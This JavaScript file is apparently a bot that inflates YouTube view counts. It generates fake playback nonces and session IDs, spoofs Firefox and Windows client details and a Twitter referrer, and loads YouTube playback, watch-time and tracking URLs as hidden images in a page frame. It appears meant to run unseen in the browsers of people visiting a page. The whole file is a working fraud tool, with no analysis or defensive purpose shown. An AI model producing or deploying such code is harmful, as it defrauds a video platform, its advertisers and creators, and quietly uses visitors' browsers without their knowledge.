function randomString(a) {
    var b = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
    var c = a;
    var d = '';
    for (var i = 0; i < c; i++) {
        var e = Math.floor(Math.random() * b.length);
        d += b.substring(e, e + 1)
    }
    return d
}

function randomxtring(a) {
    var b = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz-_";
    var c = a;
    var d = '';
    for (var i = 0; i < c; i++) {
        var e = Math.floor(Math.random() * b.length);
        d += b.substring(e, e + 1)
    }
    return d
}

function randomYtring(a) {
    var b = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz_";
    var c = a;
    var d = '';
    for (var i = 0; i < c; i++) {
        var e = Math.floor(Math.random() * b.length);
        d += b.substring(e, e + 1)
    }
    return d
}

function randomZtring(a) {
    var b = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz-";
    var c = a;
    var d = '';
    for (var i = 0; i < c; i++) {
        var e = Math.floor(Math.random() * b.length);
        d += b.substring(e, e + 1)
    }
    return d
}

function randomWtring(a) {
    var b = "0123456789";
    var c = a;
    var d = '';
    for (var i = 0; i < c; i++) {
        var e = Math.floor(Math.random() * b.length);
        d += b.substring(e, e + 1)
    }
    return d
}

function randomIntFromInterval(a, b) {
    return Math.floor(Math.random() * (b - a + 1) + a)
}

function randomDecFromInterval(a, b) {
    return Math.random() * (b - a + 1) + a
}
var BASE_64 = (("ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz") + "0123456789-_");

function makeHash(a) {
    var b = (0.0598867742810398 * a);
    b = (b + 21845.3333282471);
    a = (b | 0);
    b = (b - a);
    b = (b * a);
    a = (b | 0);
    b = (b - a);
    a = (a ^ (b * 4294967296));
    return ((a >>> 0))
}

function copyObject(a, b) {
    var c;
    for (c in a) {
        b[c] = String(a[c])
    };
    return (b)
}

function getPlaybackNonce(a) {
    var b;
    var c;
    var d;
    var e;
    var f = [(Math.random() * 4294967295), (Math.random() * 4294967295), (Math.random() * 4294967295)];
    a = copyObject(a, {
        getTimer: 3,
        totalMemory: 20000,
        Capabilities: "A=t&SA=t&SV=t&EV=t&MP3=t&AE=t&VE=t&ACC=f&PR=t&SP=t&SB=f&DEB=t&V=WIN%209%2C0%2C0%2C0&M=Adobe%20Windows&R=1600x1200&DP=72&COL=color&AR=1.0&OS=Windows%20XP&L=en&PT=External&AVD=f&LFD=f&WD=f&IME=t&DD=f&DDP=f&DTS=f&DTE=f&DTH=f&DTM=f"
    });
    var g = 0;
    for (var h in a) {
        if ((typeof (h) == "number")) {
            f[(g % 3)] = makeHash((f[(g % 3)] ^ h));
            g++
        } else {
            if ((typeof (h) == "string")) {
                b = 0;
                while (b < h.length) {
                    f[(g % 3)] = makeHash((f[(g % 3)] ^ h.charCodeAt(b)));
                    g++;
                    b++
                }
            }
        }
    };
    c = new Array(33).join("0");
    d = "";
    b = 0;
    while (b < 3) {
        e = f[b].toString(2);
        d = (d + (c.slice(0, (32 - e.length)) + e));
        b++
    };
    var i = [];
    b = 0;
    while (b < d.length) {
        i.push(BASE_64.charAt(parseInt(d.substr(b, 6), 2)));
        b = (b + 6)
    };
    this.clientPlaybackNonce = i.join("");
    return (this.clientPlaybackNonce)
}

function getPlaybackNonce2(arg) {
    var _local5=0;
    var _local6=null;
    var _local7='';
    var _local8='';
    var _local10='';
    var _local2 = [(Math.random() * 4294967295), (Math.random() * 4294967295), (Math.random() * 4294967295)];
    var a = {
        getTimer: 3,
        totalMemory:4000,
        Capabilities: "A=t&SA=t&SV=t&EV=t&MP3=t&AE=t&VE=t&ACC=f&PR=t&SP=t&SB=f&DEB=t&V=WIN%209%2C0%2C0%2C0&M=Adobe%20Windows&R=1600x1200&DP=72&COL=color&AR=1.0&OS=Windows%20XP&L=en&PT=External&AVD=f&LFD=f&WD=f&IME=t&DD=f&DDP=f&DTS=f&DTE=f&DTH=f&DTM=f",
		video_id: arg.video_id
    };
	var _local4 = 0;
    for (var _local6 in a) {
        if ((typeof a[_local6] === 'number')){
            _local2[(_local4 % 3)] = makeHash((_local2[(_local4 % 3)] ^ a[_local6]));
            _local4++;
        } else {
            if ((typeof a[_local6] === 'string')){
                _local5 = 0;
                while (_local5 < a[_local6].length) {
                    _local2[(_local4 % 3)] = makeHash((_local2[(_local4 % 3)] ^ a[_local6].charCodeAt(_local5)));
                    _local4++;
                    _local5++;
                };
            };
        };
    };
    _local7 = Array(33).join("0");
    _local8 = "";
    _local5 = 0;
    while (_local5 < 3) {
        _local10 = _local2[_local5].toString(2);
        _local8 = (_local8 + (_local7.slice(0, (32 - _local10.length)) + _local10));
        _local5++;
    };
    var _local9 = [];
    _local5 = 0;
    while (_local5 < _local8.length) {
        _local9.push(BASE_64.charAt(parseInt(_local8.substr(_local5, 6), 2)));
        _local5 = (_local5 + 6);
    };
    var clientPlaybackNonce = _local9.join("");
    return clientPlaybackNonce;
}

function nxtPlid(a) {
    var b = a.substring(0, 5);
    var c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_".charAt("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_".indexOf(a.charAt(5)) + 1) != "" ? "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_".charAt("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_".indexOf(a.charAt(5)) + 1) : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_".charAt("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_".indexOf(a.charAt(5)));
    b = b + c + randomxtring(10);
    return b
}

function loadstt(a) {
    var b = '<img src="' + a + '" />';
    top.frames[0].document.body.innerHTML = b
}

function loadCookies(a,b) {
    loadstt("http://www.youtube.com/get_video_info?html5=1&video_id="+a+"&cpn="+b+"&eurl=http%3A%2F%2Fwww.youtube.com%2F&el=embedded&hl=en_US&sts=16092&width=550&height=295&iframe=1&asv=3")
}
var referrer = (escape("http://twitter.com/")).replace(/\//g, "%2F");
var vidIdArr = ["BE9Iet4I5Wk"];
var vidLenArr = [75];
var vidPlidArr = [randomxtring(16)];
var vidEiArr = [randomYtring(22)];
var vidFexpArr = ["921079,902545,938630,936910,936913,907231,907240,921090"];
var ldpj = "-" + randomIntFromInterval(10, 30);
var idpj = "-" + randomIntFromInterval(3, 16);
var ucid = "";
var fmt = "134";
var ns = "yt";
var el = "embedded";
var c = "web";
var cver = "as3";
var cbr = "Firefox";
var cbrver = "26.0";
var cos = "Windows";
var cosver = "6.1";
var html5 = "1";
var ptk = "youtube_none";
var fs = "0";
var vis = "0";
var asv = "3";
var noflv = "1";
var t = "vjVQa1PpcFPCpxZ1Uv9wpRkybefNkloJ784qOxedqVU%3D";

function getUserWatchUrl(a, b, c, d, e, f) {
    var g = a;
    var h = d;
    var i = c;
    var j = e;
    var k = "false";
    return ''
}

function getGetVideoUrl(a, b, c, d, e) {
    var f = a;
    var g = d;
    return 'http://www.youtube.com/get_video?noflv=' + noflv + '&video_id=' + f + '&cpn=' + g + '&el=' + el + '&referrer=' + referrer + '&fmt=' + fmt + '&ptk=' + ptk + '&t=' + t
}

function getPTrackingUrl(a, b, c, d, e, f) {
    var g = a;
    var h = d;
    var i = c;
    var j = e;
    var k = "contentugc";
    return 'http://www.youtube.com/ptracking?video_id=' + g + '&cpn=' + h + '&plid=' + i + '&ei=' + j + '&ptk=' + ptk + '&pltype=' + k
}

function getStream204Url(a, b, c, d, e, f, g, h, i, j, k, l, m, n) {
    var o = e;
    var p = d;
    var q = a;
    var r = "streamingstats";
    var s = "1";
    var o = e;
    var s = "1";
    var r = "streamingstats";
    var q = a;
    var p = d;
    var o = e;
    var s = "1";
    var r = "streamingstats";
    var p = d;
    var q = a;
    var o = e;
    var s = "1";
    var r = "streamingstats";
    var q = a;
    var p = d;
    var o = e;
    var s = "1";
    var p = d;
    var q = a;
    var r = "streamingstats";
    var t = "";
    if (g == 1) {
        t = 'http://s.youtube.com/stream_204?fmt=' + fmt + '&ei=' + o + '&view=' + i + '&cpn=' + p + '&ns=' + ns + '&vfs=' + j + '&docid=' + q + '&el=' + el + '&event=' + r + '&scoville=' + s
    } else if (g == 2) {
        t = 'http://s.youtube.com/stream_204?fmt=' + fmt + '&ei=' + o + '&scoville=' + s + '&event=' + r + '&ns=' + ns + '&docid=' + q + '&vps=' + k + '&el=' + el + '&cpn=' + p
    } else if (g == 3) {
        t = 'http://s.youtube.com/stream_204?fmt=' + fmt + '&ei=' + o + '&scoville=' + s + '&event=' + r + '&cpn=' + p + '&ns=' + ns + '&docid=' + q + '&bwm=' + l + '&bh=' + m + '&vps=' + k + '&el=' + el + '&df=' + n
    } else if (h) {
        t = 'http://s.youtube.com/stream_204?fmt=' + fmt + '&ei=' + o + '&scoville=' + s + '&cpn=' + p + '&ns=' + ns + '&docid=' + q + '&vps=' + k + '&el=' + el + '&df=' + n + '&event=' + r
    } else {
        t = 'http://s.youtube.com/stream_204?ei=' + o + '&ns=' + ns + '&scoville=' + s + '&event=' + r + '&docid=' + q + '&df=' + n + '&cpn=' + p + '&fmt=' + fmt + '&vps=' + k + '&el=' + el
    }
    return t
}

function getPlaybackUrl(a, b, d, e, f, g, h, i, j, k, l, m, n) {
    var o = f;
    var p = "en_US";
    var q = e;
    var r = b;
    var n = randomIntFromInterval(1200, 1800);
    var s = a;
    var t = "0";
    var i = "1." + randomWtring(3);
    var h = "0.143";
    var j = randomIntFromInterval(4, 10);
    var u = "US";
    var v = "2";
    var w = g;
    var x = d;
    var y = "100";
    return 'http://s.youtube.com/api/stats/playback?ei=' + o  + '&cpn=' + q + '&len=' + r + '&fs=' + fs + '&docid=' + s + '&mos=' + t + '&rt=' + i + '&c=' + c + '&cmt=' + h + '&fmt=' + fmt + '&ver=' + v + '&fexp=' + w + '&euri=' + referrer + '&plid=' + x + '&volume=' + y + '&ns=' + ns + '&el=' + el + '&cver=' + cver + '&hl=en_US' + '&feature=player_detailpage'+ '&cr=US' + '&rtn=1'
	
}

function getCsiUrl(a, b, c, d, f, g) {
    var v = "2";
    var s = "youtube";
    var h = "watch,watch7";
    var i = a;
    var j = c;
    var k = d;
    var l = "WIN 11,8,800,168";
    var m = f;
    var n = "flash";
    var o = "cold";
    var p = "0";
    var q = "0";
    var r = "0";
    var e = g;
    var t = randomIntFromInterval(600, 730);
    var u = "ce.146,cl.146,bf.161,hr.177,je.317,jl.333,ol.333,tdl.427,fs.536,gv.672,vr.4233,vri.666,fvf.2164,fvb.2201,pre_cc.642,aft.4233";
    var w = "st.147,vl.3561";
    return 'http://csi.gstatic.com/csi?v=' + v + '&s=' + s + '&action=' + h + '&docid=' + i + '&plid=' + j + '&cpn=' + k + '&fv=' + l + '&asv=' + asv + '&ei=' + m + '&yt_pt=' + n + '&fmt=' + fmt + '&yt_lt=' + o + '&yt_ad=' + p + '&yt_li=' + q + '&yt_spf=' + r + '&e=' + e + '&srt=' + t + '&rt=' + u + '&it=' + w
}

function getWatchTimeUrl(a, b, d, e, f, g, h, i, j, k, l, m, n, o) {
    var p = f;
    var q = "en_US";
    var r = e;
    var s = b;
    var t = a;
    var u = "playing";
    var v = "US";
    var w = d;
	var ww = "0";
    var x = "2";
    var y = g;
    var z = '';
    z = 'http://s.youtube.com/api/stats/watchtime?ei=' + p + '&cpn=' + r + '&len=' + s + '&ldpj=' + ldpj + '&docid=' + t + '&idpj=' + idpj + '&rt=' + j + '&et=' + n + '&st=' + m + '&state=' + u + '&c=' + c + '&rti=' + l + '&cmt=' + i + '&fmt=' + fmt + '&ns=' + ns + '&plid=' + w + '&ver=' + x + '&el=' + el + '&cver=' + cver + '&euri=' + referrer + '&fs=' +ww + '&rtn='+ Math.ceil(3*j) + '&hl=en_US' + '&feature=player_detailpage' + '&cr=US'
    return z
	
}


function getSetAwesomeUrl(a, b, d, e, f, g) {
    var h = a;
    var w = randomDecFromInterval(0.8, 0.9).toFixed(16);
    var l = b;
    var i = d;
    var j = f;
    var k = (b * 0.8155723).toFixed(15);
    var m = e;
    return 'http://www.youtube.com/set_awesome?html5=' + html5 + '&video_id=' + h + '&el=' + el + '&w=' + w + '&l=' + l + '&plid=' + i + '&ei=' + j + '&tpmt=' + k + '&cpn=' + m + '&c=' + c + '&cver=' + cver + '&cbr=' + cbr + '&cbrver=' + cbrver + '&cos=' + cos + '&cosver=' + cosver + '&referrer=' + referrer
}

function visitGenerate204Urls() {
    var a = "http://r$NUM$---sn-x1x7snee.googlevideo.com/generate_204";
    for (i = 1; i < 21; i++) {
        loadstt(a.replace("$NUM$", i))
    }
}

function getSUrl(a, b, c, d, e, f) {
    var g = e;
    var h = (randomIntFromInterval(13, 20) / 1000).toFixed(3);
    var i = c;
    var j = h;
    var k = "1";
    var l = "1";
    var m = a;
    var n = d;
    return 'http://s2.youtube.com/s?fmt=' + fmt + '&ns=' + ns + '&ei=' + g + '&et=' + h + '&plid=' + i + '&ctp=' + k + '&yttk=' + l + '&el=' + el + '&docid=' + m + '&cpn=' + n
	
}


function initView(n, o, p, q, r, s) {
    var i = 1;
    var u = randomDecFromInterval(10, 10);
    var v = (u + randomDecFromInterval(1, 1));
    var w = 0;
    var x = 0;
    var y = 10,
        lastDelay = 10;
    var z = setInterval(function () {
        if (i == 3) {
            y = 16
        } else if (i == 4) {
            lastDelay = 16;
            y = 40
        } else if (i == 5) {
            lastDelay = 40
        }
        var e = (w != 0) ? w : Math.floor(u);
        if (i != 1) {
            u = w + randomIntFromInterval(10, 99) / 1000;
            v = u + randomDecFromInterval(2, 3)
        }
        w = Math.floor(u + y);
        var f = (u > o);
        var g = (f) ? o : u.toFixed(3);
        var h = v.toFixed(3);
        var j = w;
        var k = x;
        x = (parseFloat(g) - 0.100).toFixed(3);
        var l = Math.floor(g * 1000 + randomIntFromInterval(500, 900));
        loadstt(getWatchTimeUrl(n, o, p, s, r, q, f, g, h, j, e, k, x, l));
     /*   if (f) {
            clearInterval(z);
            i = 2;
            loadstt(getSetAwesomeUrl(n, o, p, s, r, q));
            var m = setInterval(function () {
                var a = i;
                var b = false;
                var c = 10 + 30 * (i - 2);
                if (c > o) {
                    c = o;
                    b = true
                }
                var d, view, vps, df, bwm, bh;
                if (i == 1) {
                    d = "0.000:134:134::i";
                    view = "0.000:640:390"
                } else if (i == 2) {
                    vps = "0.000:N,0." + randomIntFromInterval(200, 500) + ":PL"
                } else if (i == 3) {
                    var t = randomDecFromInterval(c, c + 1).toFixed(3);
                    bwm = t + ":" + randomIntFromInterval(3368749, 3396337) + ".000:" + randomDecFromInterval(2, 27).toFixed(3);
                    bh = t + ":" + randomDecFromInterval(2, 27).toFixed(3);
                    vps = t + ":PL";
                    df = t + ":" + randomIntFromInterval(50, 800)
                } else if (b) {
                    var t = randomDecFromInterval(c, c + 1).toFixed(3);
                    vps = t + ":PA," + (parseFloat(t) + 0.220) + ":EN";
                    df = parseFloat(t) + 0.220 + ":" + randomIntFromInterval(50, 800)
                } else {
                    var t = randomDecFromInterval(c, c + 1).toFixed(3);
                    vps = t + ":PL";
                    df = t + ":" + randomIntFromInterval(50, 800)
                }
                loadstt(getStream204Url(n, o, p, s, r, q, a, b, view, d, vps, bwm, bh, df));
                if (b) {
                    clearInterval(m)
                }
                i++
            }, 700)
        }*/
		clearInterval(z);
        i++
    }, 700)
}

function tqwe() {

	var e = getPlaybackNonce({
                video_id: vidIdArr[0]
            });
    loadCookies(vidIdArr[0],e);
		for(count = 0; count<2; count++)
			{
    setTimeout(function () {
        for (idx = 0; idx < vidIdArr.length; idx++) {
            var b = vidIdArr[idx];
            var c = vidLenArr[idx];
            var d = encodeURIComponent(vidFexpArr[idx]);
            
            var f = "AATw" + randomxtring(12);
            var g = randomYtring(22);
            var h = 500;
         //   visitGenerate204Urls();
           
           
            loadstt(getPlaybackUrl(b, c, f, e, g, d, d, null, null, null, null, null, null, null));
            loadstt(getSUrl(b, c, f, e, g, d));
            initView(b, c, f, d, g, e);
           
			
        }
   }, 1200)
	}
}
/*
getPlaybackNonce({
    video_id: vidIdArr[0]
});
*/
